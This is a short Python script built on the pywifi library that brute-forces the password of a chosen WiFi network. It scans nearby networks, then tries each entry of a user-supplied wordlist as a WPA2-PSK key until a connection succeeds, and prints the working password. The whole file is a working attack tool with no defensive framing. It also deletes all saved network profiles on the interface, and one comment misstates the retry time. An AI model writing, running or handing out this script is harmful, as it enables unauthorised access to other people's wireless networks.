
import pywifi 
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import time

def select_wifi_interface(interfaces):
    print("Available WiFi Interfaces:")
    for i, interface in enumerate(interfaces):
        print(f"{i + 1}. {interface.name()}")
    choice = int(input("Select the interface number: ")) - 1
    if 0 <= choice < len(interfaces):
        return interfaces[choice]
    else:
        print("Invalid choice. Exiting.")
        exit()

try:
    wifi = PyWiFi()
    interfaces = wifi.interfaces()
    if not interfaces:
        print("No WiFi interfaces found.")
        exit()
    
    selected_interface = select_wifi_interface(interfaces)
    
    print(f"Selected WiFi Interface: {selected_interface.name()}")
    selected_interface.scan()
    time.sleep(2)  # Give time for scanning
    scan_results = selected_interface.scan_results()
    
    print("Available Networks:")
    for i, result in enumerate(scan_results):
        print(f"{i + 1}. SSID: {result.ssid}, Signal: {result.signal}")
    
except Exception as e:
    print("Error:", e)
    exit()

def connect_to_wifi(SSID, PASSWORD):
    prof = Profile()
    prof.ssid = SSID
    prof.auth = const.AUTH_ALG_OPEN
    prof.akm.append(const.AKM_TYPE_WPA2PSK)
    prof.cipher = const.CIPHER_TYPE_CCMP
    prof.key = PASSWORD
    
    selected_interface.remove_all_network_profiles()
    temp_prof = selected_interface.add_network_profile(prof)
    time.sleep(0.1)
    selected_interface.connect(temp_prof)
    
    for _ in range(3):  # Retry for up to 10 seconds
        if selected_interface.status() == const.IFACE_CONNECTED:
            print(f"Connected to {SSID} successfully with password: {PASSWORD}")
            exit()
        time.sleep(1)
    
    print(f"Failed to connect to {SSID} with password: {PASSWORD}")

def run():
    try:
        target_ssid = input("Enter the target SSID: ")
        target_passwords = input("Enter passwords file path: ")
        
        with open(target_passwords, "r") as file:
            passwords = file.readlines()
        
        for password in passwords:
            password = password.strip()
            print(f"Trying password: {password}")
            connect_to_wifi(target_ssid, password)
        
        print("All passwords are incorrect!")
    
    except Exception as e:
        print("Error:", e)

run()
